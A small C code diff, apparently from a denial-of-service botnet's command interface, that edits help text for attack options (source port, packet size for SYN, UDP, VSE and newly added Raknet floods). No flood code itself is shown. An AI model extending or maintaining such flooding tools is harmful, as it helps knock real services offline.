@@ -87,7 +87,7 @@ void handle_opthelp_command(char *response) {
     snprintf(response, MAX_COMMAND_LENGTH,
              "\r\n" YELLOW "Optional Arguments:\n"
              "\rsrcport=<port> - Source port for the attack (SYN,UDP)\n"
-             "\rpsize=<size> - Packet size (max: 1492 VSE, 64500 SYN,UDP)\n"
+             "\rpsize=<size> - Packet size (max: 1492 VSE & Raknet, 64500 SYN,UDP)\n"
              RESET);
 }
 
